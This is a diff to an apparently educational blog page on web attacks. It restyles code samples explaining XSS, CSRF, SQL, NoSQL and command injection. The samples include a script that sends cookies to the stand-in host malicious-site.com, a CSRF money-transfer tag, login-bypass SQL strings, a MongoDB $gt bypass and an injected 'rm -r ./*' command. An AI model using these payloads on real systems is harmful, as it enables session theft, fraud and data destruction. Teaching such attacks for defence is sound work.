@@ -39,24 +39,16 @@ JavaScript in another user&#39;s browser.</p>
 the database, therefore, each user who opened the page will be attacked.</p>
 <p>For example, if there is a input tag, user can post their own content by it. Other users can open this page see 
 the content.</p>
-<pre><code class="language-html">&lt;!--the content in this tag will be post to database--&gt;
-&lt;input type=&quot;text&quot;&gt; 
+<pre><code class="hljs html"><span class="hljs-comment">&lt;!--the content in this tag will be post to database--&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span> 
 
-&lt;!--if a user input &quot;Users content&quot;, other user can see as below--&gt;
-&lt;p&gt;Users content&lt;/p&gt;
-</code></pre>
-<p>But, if someone input a string as below:</p>
-<pre><code class="language-html">&lt;script src=&quot;http://www.malicious-site.com/code&quot;&gt;&lt;/script&gt;
-</code></pre>
-<p>the final result may as:</p>
-<pre><code class="language-html">&lt;p&gt;&lt;script src=&quot;http://www.malicious-site.com/code&quot;&gt;&lt;/script&gt;&lt;/p&gt;
-</code></pre>
-<p>And the script like as below:</p>
-<pre><code class="language-js">var img = document.createElement(&#39;img&#39;);
-img.src = &#39;http://www.malicious-site.com/save-cookie?cookie=&#39; + document.cookie;
-document.body.appendChild(img);
-</code></pre>
-<p>In this way, the malicious site can get the cookie of each user who open the page.</p>
+<span class="hljs-comment">&lt;!--if a user input &quot;Users content&quot;, other user can see as below--&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Users content<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p>But, if someone input a string as below:</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.malicious-site.com/code&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>the final result may as:</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.malicious-site.com/code&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p>And the script like as below:</p>
+<pre><code class="hljs js"><span class="hljs-keyword">var</span> img = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;img&#x27;</span>);
+img.src = <span class="hljs-string">&#x27;http://www.malicious-site.com/save-cookie?cookie=&#x27;</span> + <span class="hljs-built_in">document</span>.cookie;
+<span class="hljs-built_in">document</span>.body.appendChild(img);</code></pre><p>In this way, the malicious site can get the cookie of each user who open the page.</p>
 <p>To prevent it, I think the best way is to filter users&#39; post content.</p>
 <h3 id="reflected-xss">Reflected XSS</h3>
 <p>Its principle is the same as Persistent XSS, attacker try to get user&#39;s personal information 
@@ -64,14 +56,10 @@ by insert HTML tag.</p>
 <p>For example, there is a error page who shows error messages from the server by url, like </p>
 <p><code>http://www.some-page.com/error?message=Page%20not%20found</code></p>
 <p>the content in <code>message</code> will be showed in HTML, like:</p>
-<pre><code class="language-html">&lt;p&gt;Page not found&lt;/p&gt;
-</code></pre>
-<p>If an attack inputs an URL like </p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Page not found<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p>If an attack inputs an URL like </p>
 <p><code>http://www.some-page.com/error?message=&lt;script src=&quot;http://www.malicious-site.com/code&quot;&gt;&lt;/script&gt;</code></p>
 <p>The final HTML will become:</p>
-<pre><code class="language-html">&lt;p&gt;&lt;script src=&quot;http://www.malicious-site.com/code&quot;&gt;&lt;/script&gt;&lt;/p&gt;
-</code></pre>
-<p>Next processes will be the same as Persistent XSS.</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.malicious-site.com/code&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></code></pre><p>Next processes will be the same as Persistent XSS.</p>
 <h3 id="dom-based-xss">DOM-based XSS</h3>
 <p>According to some of articles on the Internet, Dom-based XSS is a special Reflected XSS.</p>
 <p>In my understanding, DOM-based XSS triggers attack via modifying DOM content, such as 
@@ -98,24 +86,20 @@ replace <code>&gt;</code>.</p>
 <p>For example, there is a request </p>
 <p><code>http://www.money.com?account=sender&amp;amount=10000&amp;for=receiver</code> </p>
 <p>to transfer money while the user was already logined and cookie was saved. If the user go to a malicious website which add a tag like </p>
-<pre><code class="language-html">&lt;img src=&#39;http://www.money.com?account=sender&amp;amount=10000&amp;for=hacker&#39;&gt;
-</code></pre>
-<p>the cookie will be with this request because of same domain.</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;http://www.money.com?account=sender&amp;amount=10000&amp;for=hacker&#x27;</span>&gt;</span></code></pre><p>the cookie will be with this request because of same domain.</p>
 <p>In this way, the hacker does not need to get the user&#39;s cookie when attacking.</p>
 <p>There are some ways to protect:</p>
 <h3 id="check-http-referer">Check HTTP Referer</h3>
 <p>The most simple way is to check HTTP Referer, which can identify the original website of 
 the request. </p>
 <p>In Node.JS, for example:</p>
-<pre><code class="language-js">app.use(req =&gt; {
-    if (req.headers.referer === &#39;http://legal-site.com&#39;){
-        //do something
-    } else {
-        //reject request
+<pre><code class="hljs js">app.use(<span class="hljs-function"><span class="hljs-params">req</span> =&gt;</span> {
+    <span class="hljs-keyword">if</span> (req.headers.referer === <span class="hljs-string">&#x27;http://legal-site.com&#x27;</span>){
+        <span class="hljs-comment">//do something</span>
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-comment">//reject request</span>
     }
-});
-</code></pre>
-<p>But, in some of old version chrome, such as IE6 or FF2, there are ways to artificially modify 
+});</code></pre><p>But, in some of old version chrome, such as IE6 or FF2, there are ways to artificially modify 
 HTTP Referer. Besides, users may forbid browser to offer HTTP Referer.</p>
 <h3 id="token">Token</h3>
 <p>CSRF is to forge normal real user request. So, if we can use create a token that the attacker cannot 
@@ -133,55 +117,37 @@ user information. </p>
 <h4 id="number-injection">Number Injection</h4>
 <p>For example, if there is a API to GET user&#39;s information: <code>www.example.com?id=1</code>, 
 the SQL statement may be:</p>
-<pre><code class="language-sql">SELECT * FROM users WHERE id=1
-</code></pre>
-<p>When we input <code>www.example.com?id=1 OR 1=1</code>, , the statement will become </p>
-<pre><code class="language-sql">SELECT * FROM Users WHERE id=1 OR 1=1
-</code></pre>
-<p>As a result, attacker can get whole table information. </p>
+<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span></code></pre><p>When we input <code>www.example.com?id=1 OR 1=1</code>, , the statement will become </p>
+<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></code></pre><p>As a result, attacker can get whole table information. </p>
 <h4 id="string-injection">String Injection</h4>
 <p>Or, if there is a API for POST to login, the parameters include username and password. The SQL statement may like </p>
-<pre><code class="language-sql">SELECT * FROM users WHERE username=&#39;user&#39; AND password=&#39;password&#39;
-</code></pre>
-<p>Attacker may try to make the part of statement after username become comments to directly get users&#39; information without password.</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">AND</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;password&#x27;</span></code></pre><p>Attacker may try to make the part of statement after username become comments to directly get users&#39; information without password.</p>
 <p>For example, if the user input is <code>user&#39; # </code> and password as <code>password&#39;</code>, the final statement will become:</p>
-<pre><code class="language-sql">SELECT * FROM users WHERE username=&#39;user&#39; # &#39; AND password=&#39;password&#39;&#39;
-</code></pre>
-<p>Similarly, input user as <code>user&#39; -- </code> also work as:</p>
-<pre><code class="language-sql">SELECT * FROM users WHERE username=&#39;user&#39; -- &#39; AND password=&#39;password&#39;
-</code></pre>
-<p>These two statements are both the same as:</p>
-<pre><code class="language-sql">SELECT * FROM users WHERE username=&#39;user&#39;
-</code></pre>
-<h3 id="nosql-injection">NoSQL Injection</h3>
+<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span> # <span class="hljs-string">&#x27; AND password=&#x27;</span>password<span class="hljs-string">&#x27;&#x27;</span></code></pre><p>Similarly, input user as <code>user&#39; -- </code> also work as:</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-comment">-- &#x27; AND password=&#x27;password&#x27;</span></code></pre><p>These two statements are both the same as:</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;user&#x27;</span></code></pre><h3 id="nosql-injection">NoSQL Injection</h3>
 <p>Like SQL, NoSQL database like MongoDB can also be injected.</p>
 <p>Like the same example in SQL Injection, if the application uses NoSQL database such as Mongodb, 
 the statement may be:</p>
-<pre><code>db.users.find({username:user, password=password})
-</code></pre>
-<p>If someone&#39;s JSON input object likes:</p>
-<pre><code>{
+<pre><code class="hljs ">db.users.find({username:user, password=password})</code></pre><p>If someone&#39;s JSON input object likes:</p>
+<pre><code class="hljs ">{
   &quot;username&quot;: &quot;user&quot;,
   &quot;password&quot;: {$gt: &quot;&quot;}
-}
-</code></pre>
-<p>In MongoDB, <code>$gt</code> selects those documents where the value of the field is greater than (i.e. &gt;) the specified value. 
+}</code></pre><p>In MongoDB, <code>$gt</code> selects those documents where the value of the field is greater than (i.e. &gt;) the specified value. 
 Thus above statement compares password in database with empty string for greatness, which returns true.</p>
 <p>The same results can be achieved using other comparison operator such as $ne.</p>
 <h3 id="command-injection">Command Injection</h3>
 <p>Like SQL Injection and NoSQL Injection, Command Injection will also run malicious code because of a user&#39;s input. </p>
 <p>For example, if there is an API allows users to compress specific file in the server:</p>
-<pre><code class="language-js">app.use.get(&#39;/gzip&#39;, (req, res)=&gt;{
-    child_process.exec(`exec ${req.query.file_path}`, (err, data)=&gt;{
-        if (err){
+<pre><code class="hljs js">app.use.get(<span class="hljs-string">&#x27;/gzip&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span>{
+    child_process.exec(<span class="hljs-string">`exec <span class="hljs-subst">${req.query.file_path}</span>`</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>)=&gt;</span>{
+        <span class="hljs-keyword">if</span> (err){
             res.send(err.toString());
-        } else {
+        } <span class="hljs-keyword">else</span> {
             res.send(data.toString());
         }
     })
-});
-</code></pre>
-<p>If some one input an URL like: </p>
+});</code></pre><p>If some one input an URL like: </p>
 <p><code>www.example.com/gzip?file_path=file.txt\rm -r ./*</code></p>
 <p>It may be a disaster.</p>
 <h3 id="how-to-prevent">How to prevent</h3>
